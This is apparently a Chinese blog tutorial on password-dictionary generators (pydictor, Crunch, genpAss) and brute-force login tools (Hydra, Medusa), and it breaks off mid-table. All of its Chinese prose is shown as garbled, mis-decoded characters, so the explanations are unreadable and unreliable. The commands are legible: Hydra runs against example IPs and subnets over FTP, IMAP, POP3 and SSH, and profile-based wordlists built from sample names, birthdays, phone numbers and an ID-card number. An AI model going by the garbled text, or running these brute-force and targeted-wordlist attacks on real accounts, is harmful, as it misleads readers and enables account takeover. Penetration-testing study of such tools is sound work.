<p>æ— æ•°çš„å·¥å…·æ€»æœ‰ä¸€ç§è‡ªå·±å–œæ¬¢çš„ã€‚å¯¹çš„æ—¶é—´ã€å¯¹çš„åœ°ç‚¹ã€‚å“ˆå“ˆå“ˆã€‚ã€‚ã€‚</p>
<h2 id="å­—å…¸ç”Ÿæˆå·¥å…·"><a href="#å­—å…¸ç”Ÿæˆå·¥å…·" class="headerlink" title="å­—å…¸ç”Ÿæˆå·¥å…·"></a>å­—å…¸ç”Ÿæˆå·¥å…·</h2><h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 --branch=master https://www.github.com/landgrey/pydictor.git</span><br><span class="line"><span class="built_in">cd</span> pydictor/</span><br><span class="line">chmod +x pydictor.py</span><br><span class="line">python pydictor.py</span><br><span class="line"><span class="comment"># https://github.com/LandGrey/pydictor.git</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ ¸å¿ƒå‚æ•°(çœç•¥äº†æ­£åˆ™ï¼Œâ€¦)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®šé•¿åº¦</span></span><br><span class="line">--len minlen maxlen   Default: min=0  max=4</span><br><span class="line"><span class="comment"># æ ¹æ®æŒ‡å®šçš„å­—ç¬¦ä¸²è¿›è¡Œæ’åˆ—ç»„åˆ</span></span><br><span class="line">-chunk arg [arg ...]  Use the multi-chunk build the dictionary</span><br><span class="line"><span class="comment"># æŒ‡å®šå­—ç¬¦ç±»å‹ã€‚dè¡¨ç¤ºæ•°å­—,Lè¡¨ç¤ºå°å†™å­—æ¯,,,,</span></span><br><span class="line">-base Type            Choose from  (d, L, c, dL, dc, Lc, dLc)</span><br><span class="line">                           d     digital             [0 - 9]</span><br><span class="line">                           L     lowercase letters   [a - z]</span><br><span class="line">                           c     capital letters     [A - Z]</span><br><span class="line">                           dL    Mix d and L         [0-9 a-z]</span><br><span class="line">                           dc    Mix d and c         [0-9 A-Z]</span><br><span class="line">                           Lc    Mix L and c         [a-z A-Z]</span><br><span class="line">                           dLc   Mix d, L and dL     [0-9 a-z A-Z]</span><br><span class="line"> <span class="comment"># æŒ‡å®šè¾“å‡ºå­—å…¸è·¯å¾„                            </span></span><br><span class="line">-o path, --output path</span><br><span class="line"><span class="comment"># æŒ‡å®šå­—ç¬¦é›†</span></span><br><span class="line">-char character       Use Custom Character build the dictionary</span><br><span class="line"><span class="comment"># ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸</span></span><br><span class="line">--sedb                Enter the Social Engineering Dictionary Builder</span><br><span class="line"><span class="comment"># å‰ç¼€ [xxxx]pass</span></span><br><span class="line"> --head prefix         Add string head <span class="keyword">for</span> the items</span><br><span class="line"> <span class="comment"># åç¼€ pass[xxxx]</span></span><br><span class="line"> --tail suffix         Add string tail <span class="keyword">for</span> the items</span><br><span class="line"> <span class="comment"># ç”Ÿæˆçš„å­—ç¬¦è¿›è¡Œç¼–ç </span></span><br><span class="line"> --encode encode       b16       base16 encode</span><br><span class="line">                       b32       base32 encode</span><br><span class="line">                       b64       base64 encode</span><br></pre></td></tr></table></figure>

<h4 id="æ ¸å¿ƒåŠŸèƒ½å­—å…¸"><a href="#æ ¸å¿ƒåŠŸèƒ½å­—å…¸" class="headerlink" title="æ ¸å¿ƒåŠŸèƒ½å­—å…¸"></a>æ ¸å¿ƒåŠŸèƒ½å­—å…¸</h4><ul>
<li>åŸºç¡€å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -base L --len 2 3 --encode b64 <span class="comment"># é•¿åº¦2-3ä¸”ç»è¿‡base64ç¼–ç çš„å¤§å†™å­—ç¬¦</span></span><br><span class="line">python pydictor.py -base dLc --len 1 3 -o /awesome/<span class="built_in">pwd</span></span><br><span class="line">python pydictor.py -base d --len 4 4 --head Pa5sw0rd --output D:\exists\or\not\dict.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>è‡ªå®šä¹‰å­—ç¬¦é›†å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -char <span class="string">&quot;asdf123._@ &quot;</span> --len 1 3 --tail @site.com</span><br></pre></td></tr></table></figure>

<ul>
<li>æ’åˆ—ç»„åˆå­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -chunk abc 123 <span class="string">&quot;!@#&quot;</span> @ . _ <span class="string">&quot; &quot;</span> --head a --tail @pass --encode md5</span><br></pre></td></tr></table></figure>

<ul>
<li>è¯­æ³•å¼•æ“è§£æå­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py --conf                                  ç”¨é»˜è®¤çš„<span class="string">&quot;/funcfg/build.conf&quot;</span>æ–‡ä»¶å»ºç«‹å­—å…¸</span><br><span class="line">python pydictor.py --conf /my/other/awesome.conf</span><br><span class="line">python pydictor.py --conf <span class="string">&quot;[0-9]&#123;6,6&#125;&lt;none&gt;[a-f,abc,123,!@#]&#123;1,1&#125;&lt;none&gt;&quot;</span> --encode md5 --output parsing.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>è§„åˆ™æ‰©å±•å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend bob --level 4 --len 4 12</span><br><span class="line">python pydictor.py -extend liwei zwell.com --leet 0 1 2 11 21 --level 2 --len 6 16 --occur <span class="string">&quot;&lt;=10&quot;</span> <span class="string">&quot;&gt;0&quot;</span> <span class="string">&quot;&lt;=2&quot;</span> -o /possbile/wordlist.lst</span><br></pre></td></tr></table></figure>



<h4 id="æŒ‡å®šæ’ä»¶"><a href="#æŒ‡å®šæ’ä»¶" class="headerlink" title="æŒ‡å®šæ’ä»¶"></a>æŒ‡å®šæ’ä»¶</h4><ul>
<li>ç½‘é¡µåŸå§‹å…³é”®è¯å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug scratch     <span class="comment"># ç”¨/funcfg/scratch.sites æ–‡ä»¶ä¸­çš„å¤šè¡Œ url ä½œä¸ºè¾“å…¥</span></span><br><span class="line">python pydictor.py -plug scratch http://www.example.com</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸€æ®µæ—¶é—´å†…ç”Ÿæ—¥å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug birthday 19800101 20001231 --len 6 8</span><br></pre></td></tr></table></figure>

<ul>
<li>èº«ä»½è¯å4/6/8ä½å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug pid4</span><br><span class="line">python pydictor.py -plug pid6 --encode b64</span><br><span class="line">python pydictor.py -plug pid8 --encode sha1 -o pid8.txt</span><br></pre></td></tr></table></figure>

<h4 id="å†…ç½®å·¥å…·-å¯è‡ªå·±æ ¹æ®APIæ–‡æ¡£å¼€å‘"><a href="#å†…ç½®å·¥å…·-å¯è‡ªå·±æ ¹æ®APIæ–‡æ¡£å¼€å‘" class="headerlink" title="å†…ç½®å·¥å…·(å¯è‡ªå·±æ ¹æ®APIæ–‡æ¡£å¼€å‘)"></a>å†…ç½®å·¥å…·(å¯è‡ªå·±æ ¹æ®APIæ–‡æ¡£å¼€å‘)</h4><ul>
<li>å­—å…¸åˆå¹¶å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool combiner /my/mess/dir</span><br></pre></td></tr></table></figure>

<ul>
<li>å­—å…¸æ¯”è¾ƒå·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool comparer big.txt small.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>è¯é¢‘ç»Ÿè®¡å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool counter s huge.txt 1000</span><br><span class="line">python pydictor.py -tool counter v /tmp/mess.txt 100</span><br><span class="line">python pydictor.py -tool counter vs huge.txt 100 --encode url -o fre.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>å­—å…¸å¤„ç†å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool handler raw.txt --tail @awesome.com --encode md5</span><br><span class="line">python pydictor.py -tool handler raw.txt --len 6 16 --occur <span class="string">&quot;&quot;</span> <span class="string">&quot;=6&quot;</span> <span class="string">&quot;&lt;0&quot;</span> --encode b64 -o ok.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>å®‰å…¨æ“¦é™¤å­—å…¸å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool shredder                    æ“¦é™¤å½“å‰è¾“å‡ºç›®å½•ä¸‹æ‰€æœ‰å­—å…¸æ–‡ä»¶</span><br><span class="line">python pydictor.py -tool shredder base 		         æ“¦é™¤å½“å‰è¾“å‡ºç›®å½•ä¸‹æ‰€æœ‰ä»¥<span class="string">&quot;base&quot;</span>å¼€å¤´çš„å­—å…¸æ–‡ä»¶</span><br><span class="line">python pydictor.py -tool shredder /data/mess</span><br><span class="line">python pydictor.py -tool shredder D:\mess\1.zip</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆå¹¶å»é‡å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool uniqbiner /my/all/dict/</span><br></pre></td></tr></table></figure>

<ul>
<li>å­—å…¸å»é‡å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>å¤šå­—å…¸æ–‡ä»¶ç»„åˆå·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt</span><br></pre></td></tr></table></figure>

<h4 id="ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸"><a href="#ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸" class="headerlink" title="ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸"></a>ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ã€‚ã€‚ã€‚</span></span><br><span class="line">python pydictor.py --sedb</span><br><span class="line"><span class="built_in">set</span> cname liwei</span><br><span class="line"><span class="built_in">set</span> sname lw Lwei</span><br><span class="line"><span class="built_in">set</span> ename zwell</span><br><span class="line"><span class="built_in">set</span> birth 19880916</span><br><span class="line"><span class="built_in">set</span> usedpwd liwei123456. liwei@19880916 lw19880916_123</span><br><span class="line"><span class="built_in">set</span> phone 18852006666</span><br><span class="line"><span class="built_in">set</span> uphone 15500998080</span><br><span class="line"><span class="built_in">set</span> hphone 76500100 61599000 01061599000</span><br><span class="line"><span class="built_in">set</span> email 33125500@qq.com</span><br><span class="line"><span class="built_in">set</span> email 13561207878@163.com</span><br><span class="line"><span class="built_in">set</span> email weiweili@gmail.com</span><br><span class="line"><span class="built_in">set</span> email wei010wei@hotmail.com</span><br><span class="line"><span class="built_in">set</span> postcode 663321 962210</span><br><span class="line"><span class="built_in">set</span> nickname zlili</span><br><span class="line"><span class="built_in">set</span> idcard 152726198809160571</span><br><span class="line"><span class="built_in">set</span> jobnum 20051230 100563</span><br><span class="line"><span class="built_in">set</span> otherdate 19591004 19621012</span><br><span class="line"><span class="built_in">set</span> otherdate 19870906 19880208</span><br><span class="line"><span class="built_in">set</span> usedchar tiger gof gamesthrones 176003 m0n5ter ppdog</span><br><span class="line">show</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/crunchsec/crunch</span><br><span class="line"><span class="comment"># ç¼–è¯‘å®‰è£…ï¼Œä¸‹è½½ make</span></span><br><span class="line"><span class="comment"># å¯ä»¥ç›´æ¥å®‰è£… apt-get install crunch</span></span><br><span class="line"><span class="comment"># brew install crunch</span></span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨å‚æ•°:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c æ•°å­— æŒ‡å®šå†™å…¥è¾“å‡ºæ–‡ä»¶çš„è¡Œæ•°ï¼Œä¹Ÿå³åŒ…å«å¯†ç çš„ä¸ªæ•°</span><br><span class="line">-e å­—ç¬¦ä¸²ï¼Œå®šä¹‰åœæ­¢ç”Ÿæˆå¯†ç  ï¼Œæ¯”å¦‚-e 222222ï¼šåˆ°222222åœæ­¢ç”Ÿæˆå¯†ç </span><br><span class="line">-p å­—ç¬¦ä¸² æˆ–è€…-p å•è¯1 å•è¯2 ...ä»¥æ’åˆ—ç»„åˆçš„æ–¹å¼æ¥ç”Ÿæˆå­—å…¸ã€‚</span><br><span class="line">-f /path/to/charset.lst charset-nameï¼Œä»charset.lstæŒ‡å®šå­—ç¬¦é›†ï¼Œä¹Ÿå³è°ƒç”¨å¯†ç åº“æ–‡ä»¶</span><br><span class="line">-t å‘½ä»¤å¦‚ä¸‹ï¼š</span><br><span class="line">  -t @,%^ï¼ŒæŒ‡å®šæ¨¡å¼ï¼Œ@,%^åˆ†åˆ«ä»£è¡¨æ„ä¹‰å¦‚ä¸‹ï¼š</span><br><span class="line">  @ æ’å…¥å°å†™å­—æ¯</span><br><span class="line">  , æ’å…¥å¤§å†™å­—æ¯</span><br><span class="line">  % æ’å…¥æ•°å­—</span><br><span class="line">  ^ æ’å…¥ç‰¹æ®Šç¬¦å·  </span><br><span class="line">-d æ•°å­—ç¬¦å·ï¼Œé™åˆ¶å‡ºç°ç›¸åŒå…ƒç´ çš„ä¸ªæ•°(è‡³å°‘å‡ºç°å…ƒç´ ä¸ªæ•°)ï¼Œâ€œ-d 2@â€é™åˆ¶å°å†™å­—æ¯è¾“å‡ºåƒaabå’Œaacï¼Œaaaä¸ä¼šäº§ç”Ÿï¼Œå› ä¸ºè¿™æ˜¯è¿ç»­3ä¸ªå­—æ¯ï¼Œæ ¼å¼æ˜¯æ•°å­—+ç¬¦å·ï¼Œæ•°å­—æ˜¯è¿ç»­å­—æ¯å‡ºç°çš„æ¬¡æ•°ï¼Œç¬¦å·æ˜¯é™åˆ¶å­—ç¬¦ä¸²çš„å­—ç¬¦ï¼Œä¾‹å¦‚@,%^(â€œ@â€ä»£è¡¨å°å†™å­—æ¯ï¼Œâ€œ,â€ä»£è¡¨å¤§å†™å­—ç¬¦ï¼Œâ€œ%â€ä»£è¡¨æ•°å­—ï¼Œâ€œ^â€ä»£è¡¨ç‰¹æ®Šå­—ç¬¦)(é™åˆ¶æ¯ä¸ªå¯†ç è‡³å°‘å‡ºç°å‡ ç§å­—ç¬¦)</span><br></pre></td></tr></table></figure>

<ul>
<li>æ™®é€šç”Ÿæˆ</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 6</span><br><span class="line">crunch 1 6 asdqwe\@!</span><br></pre></td></tr></table></figure>

<ul>
<li>ç”ŸæˆpassXX-passXXæ‰€æœ‰ç»„åˆ</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6 -t pass%%  &gt;&gt;newpwd.txt  <span class="comment"># pass%%æ•°å­—ç»„åˆ;pass@@å°å†™å­—æ¯; pass,,å¤§å†™å­—æ¯;pass^^åä¸¤ä½ç‰¹æ®Šå­—ç¬¦</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¶ä½œ8ä¸ºæ•°å­—å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 8 8 charset.lst numeric -o num8.dic </span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¶ä½œ6ä¸ºæ•°å­—å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6  0123456789 â€“o num6.dic </span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¶ä½œ139å¼€å¤´çš„æ‰‹æœºå¯†ç å­—å…¸</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 11 11  +0123456789 -t 139%%%%%%%% -o num13.dic </span><br><span class="line">crunch 11 11  +0123456789 -t 139%%%%%%%% -b 20mib -o START  <span class="comment"># æŒ‡å®šæ–‡ä»¶å¤§å°20M</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨å¯†ç åº“</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-f /path/to/charset.lst charset-nameï¼Œä»charset.lstæŒ‡å®šå­—ç¬¦é›†ï¼Œä¹Ÿå³è°ƒç”¨å¯†ç åº“æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">crunchÂ 1Â 8Â -fÂ charset.lstÂ mixalpha-numeric-all-spaceÂ -oÂ wordlist.txtÂ </span><br><span class="line"><span class="comment"># è°ƒç”¨å¯†ç åº“charset.lstï¼Œç”Ÿæˆæœ€å°ä¸º1ï¼Œæœ€å¤§ä¸º8,å…ƒç´ ä¸ºå¯†ç åº“charset.lstä¸­ mixalpha-numeric-all-spaceçš„é¡¹ç›®ï¼Œå¹¶ä¿å­˜ä¸º wordlist.txt;å…¶ä¸­ charset.lståœ¨kali_linuxçš„ç›®å½•ä¸º /usr/share/crunch/charset.lstï¼Œ charset.lstä¸­mixalpha-numeric-all-spaceé¡¹ç›®åŒ…å«æœ€å¸¸è§çš„å…ƒç´ ç»„åˆ(å³å¤§å°å†™å­—æ¯+æ•°å­—+å¸¸è§ç¬¦å·);ä½¿ç”¨cat /usr/share/crunch/charset.lst æŸ¥çœ‹æ‰€æœ‰å¯†ç åº“</span></span><br></pre></td></tr></table></figure>

<h3 id="GenpAss"><a href="#GenpAss" class="headerlink" title="GenpAss"></a>GenpAss</h3><p>ä¸€æ¬¾é’ˆå¯¹Chineseçš„å­—å…¸ç”Ÿæˆå™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RicterZ/genpAss</span><br><span class="line"><span class="built_in">cd</span> genpAss</span><br><span class="line">git checkout master</span><br><span class="line">python setup.py install (å»ºè®®python2,æœ¬åœ°ç”¨pyhton3æœ‰é—®é¢˜)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-n       <span class="comment">#åå­—</span></span><br><span class="line">-u       <span class="comment">#ç”¨æˆ·å</span></span><br><span class="line">-q       <span class="comment">#QQå·</span></span><br><span class="line">-e       <span class="comment">#é‚®ç®±</span></span><br><span class="line">-m       <span class="comment">#æ‰‹æœºå·</span></span><br><span class="line">-b       <span class="comment">#ç”Ÿæ—¥ï¼šæ ¼å¼ï¼š2000-01-01</span></span><br><span class="line">-c       <span class="comment">#å…¬å¸å</span></span><br><span class="line">-o       <span class="comment">#å¯¼å‡ºæ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><ul>
<li>å‡å®šä¸€ä¸ªäººçš„ä¿¡æ¯å¦‚ä¸‹ï¼š</li>
</ul>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>ä¿¡æ¯</th>
</tr>
</thead>
<tbody><tr>
<td>å§“å</td>
<td>ç‹å¤§é”¤</td>
</tr>
<tr>
<td>ç”¨æˆ·å</td>
<td>dachui,dac</td>
</tr>
<tr>
<td>QQ</td>
<td>818271273</td>
</tr>
<tr>
<td>æ‰‹æœº</td>
<td>13928182828</td>
</tr>
<tr>
<td>é‚®ç®±</td>
<td><span class="exturl" data-url="bWFpbHRvOndhbmdkYWNAZ21haWwuY29t">wangdac@gmail.com<i class="fa fa-external-link-alt"></i></span></td>
</tr>
<tr>
<td>ç”Ÿæ—¥</td>
<td>1993-12-21</td>
</tr>
<tr>
<td>å…¬å¸</td>
<td>baidu</td>
</tr>
</tbody></table>
<p>è¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">genpass -n ç‹å¤§é”¤ -u dachui dac -b 1993-12-21 -c baidu -m 13928182828 -q 818271273 -e wangdac@gmail.com</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶å¯ä»¥æ·»åŠ <code>--with-dict</code>æ¥æ ¹æ®å¸¸è§å¼±å£ä»¤ç»„åˆå¯†ç ã€‚</p>
<p>å¦å¤–å¯ä»¥é€šè¿‡<code>--csv</code>æŒ‡å®š csv æ–‡ä»¶æ‰¹é‡ç”Ÿæˆå¯†ç ï¼Œcsv æ–‡ä»¶æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name,email,birthday,username,mobile_phone,qq_number,company,</span><br><span class="line">æµ‹è¯•,ceshi@x.com,1995-01-03,<span class="built_in">test</span> cece,18883866666,23591712,google,</span><br><span class="line">å¤§å¤´,datou@x.com,1996-03-03,bighead,18883877777 18883899999,392912031,baidu,</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨æš´åŠ›ç ´è§£å·¥å…·"><a href="#å¸¸ç”¨æš´åŠ›ç ´è§£å·¥å…·" class="headerlink" title="å¸¸ç”¨æš´åŠ›ç ´è§£å·¥å…·"></a>å¸¸ç”¨æš´åŠ›ç ´è§£å·¥å…·</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydraæ˜¯é»‘å®¢ç»„ç»‡thcçš„ä¸€æ¬¾å¼€æºå¯†ç æ”»å‡»å·¥å…·ï¼ŒåŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œæ”¯æŒå¤šç§åè®®çš„ç ´è§£ã€‚ï¼ˆæ”¯æŒçš„åè®®åŒ…æ‹¬: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmppï¼‰</p>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">å‚æ•°è¯¦è§£</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-l</td>
<td align="left">æŒ‡å®šå•ä¸ªç”¨æˆ·åï¼Œé€‚åˆåœ¨çŸ¥é“ç”¨æˆ·åçˆ†ç ´ç”¨æˆ·åå¯†ç æ—¶ä½¿ç”¨</td>
</tr>
<tr>
<td align="left">-L</td>
<td align="left">æŒ‡å®šå¤šä¸ªç”¨æˆ·åï¼Œå‚æ•°å€¼ä¸ºå­˜å‚¨ç”¨æˆ·åçš„æ–‡ä»¶çš„è·¯å¾„(å»ºè®®ä¸ºç»å¯¹è·¯å¾„)</td>
</tr>
<tr>
<td align="left">-p</td>
<td align="left">æŒ‡å®šå•ä¸ªå¯†ç ï¼Œé€‚åˆåœ¨çŸ¥é“å¯†ç çˆ†ç ´ç”¨æˆ·åæ—¶ä½¿ç”¨</td>
</tr>
<tr>
<td align="left">-P</td>
<td align="left">æŒ‡å®šå¤šä¸ªå¯†ç ï¼Œå‚æ•°å€¼ä¸ºå­˜è´®å¯†ç çš„æ–‡ä»¶(é€šå¸¸ç§°ä¸ºå­—å…¸)çš„è·¯å¾„(å»ºè®®ä¸ºç»å¯¹è·¯å¾„)</td>
</tr>
<tr>
<td align="left">-C</td>
<td align="left">å½“ç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åˆ°ä¸€ä¸ªæ–‡ä»¶æ—¶ä½¿ç”¨æ­¤å‚æ•°ã€‚å­—å…¸å­˜å‚¨çš„æ ¼å¼å¿…é¡»ä¸º â€œç”¨æˆ·å:å¯†ç â€ çš„æ ¼å¼ã€‚</td>
</tr>
<tr>
<td align="left">-M</td>
<td align="left">æŒ‡å®šå¤šä¸ªæ”»å‡»ç›®æ ‡ï¼Œå»ºè®®ä¸ºç»å¯¹è·¯å¾„ã€‚æ³¨æ„ï¼šåˆ—è¡¨æ–‡ä»¶å­˜å‚¨æ ¼å¼å¿…é¡»ä¸º â€œåœ°å€:ç«¯å£â€</td>
</tr>
<tr>
<td align="left">-t</td>
<td align="left">æŒ‡å®šçˆ†ç ´æ—¶çš„ä»»åŠ¡æ•°é‡(å¯ä»¥ç†è§£ä¸ºçº¿ç¨‹æ•°)ï¼Œé»˜è®¤ä¸º16</td>
</tr>
<tr>
<td align="left">-s</td>
<td align="left">æŒ‡å®šç«¯å£ï¼Œé€‚ç”¨äºæ”»å‡»ç›®æ ‡ç«¯å£éé»˜è®¤çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼šhttpæœåŠ¡ä½¿ç”¨é80ç«¯å£</td>
</tr>
<tr>
<td align="left">-S</td>
<td align="left">æŒ‡å®šçˆ†ç ´æ—¶ä½¿ç”¨ SSL é“¾æ¥</td>
</tr>
<tr>
<td align="left">-R</td>
<td align="left">ç»§ç»­ä»ä¸Šä¸€æ¬¡çˆ†ç ´è¿›åº¦ä¸Šç»§ç»­çˆ†ç ´</td>
</tr>
<tr>
<td align="left">-v/-V</td>
<td align="left">æ˜¾ç¤ºçˆ†ç ´çš„è¯¦ç»†ä¿¡æ¯</td>
</tr>
<tr>
<td align="left">-f</td>
<td align="left">ä¸€ä½†çˆ†ç ´æˆåŠŸä¸€ä¸ªå°±åœæ­¢çˆ†ç ´</td>
</tr>
<tr>
<td align="left">server</td>
<td align="left">ä»£è¡¨è¦æ”»å‡»çš„ç›®æ ‡(å•ä¸ª)ï¼Œå¤šä¸ªç›®æ ‡æ—¶è¯·ä½¿ç”¨ -M å‚æ•°</td>
</tr>
<tr>
<td align="left">service</td>
<td align="left">æ”»å‡»ç›®æ ‡çš„æœåŠ¡ç±»å‹(å¯ä»¥ç†è§£ä¸ºçˆ†ç ´æ—¶ä½¿ç”¨çš„åè®®)ï¼Œä¾‹å¦‚ http ï¼Œåœ¨hydraä¸­ï¼Œä¸åŒåè®®ä¼šä½¿ç”¨ä¸åŒçš„æ¨¡å—æ¥çˆ†ç ´ï¼Œhydra çš„ http-get å’Œ http-post æ¨¡å—å°±ç”¨æ¥çˆ†ç ´åŸºäº get å’Œ post è¯·æ±‚çš„é¡µé¢</td>
</tr>
<tr>
<td align="left">OPT</td>
<td align="left">çˆ†ç ´æ¨¡å—çš„é¢å¤–å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ -U å‚æ•°æ¥æŸ¥çœ‹æ¨¡å—æ”¯æŒé‚£äº›å‚æ•°ï¼Œä¾‹å¦‚å‘½ä»¤ï¼šhydra -U http-get</td>
</tr>
</tbody></table>
<h4 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h4><p>å¸¸ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure>

<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusaæ˜¯æ”¯æŒAFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNCçš„å¯†ç çˆ†ç ´å·¥å…·ã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯¦è§£</th>
</tr>
</thead>
<tbody><tr>
<td>-h</td>
<td>æŒ‡å®šç›®æ ‡IP</td>
</tr>
<tr>
<td>-H</td>
<td>æŒ‡å®šç›®æ ‡ä¸»æœºæ–‡ä»¶</td>
</tr>
<tr>
<td>-u</td>
<td>æŒ‡å®šå•ä¸ªç”¨æˆ·å</td>
</tr>
<tr>
<td>-U</td>
<td>æŒ‡å®šç”¨æˆ·åæ–‡ä»¶</td>
</tr>
<tr>
<td>-p</td>
<td>æŒ‡å®šå•ä¸ªå¯†ç </td>
</tr>
<tr>
<td>-P</td>
<td>æŒ‡å®šå¯†ç æ–‡ä»¶</td>
</tr>
<tr>
<td>-C</td>
<td>ç»„åˆæ¡ç›®æ–‡ä»¶ è´¦å·:å¯†ç </td>
</tr>
<tr>
<td>-e [n/s/ns]</td>
<td>Næ„ä¸ºç©ºå¯†ç ï¼ŒSæ„ä¸ºå¯†ç  ï¼ŒNSåˆ¤æ–­å¯†ç æ˜¯å¦æ˜¯ç©ºå¯†ç ,è¿˜æ˜¯è´¦å·å¯†ç ç›¸åŒã€‚</td>
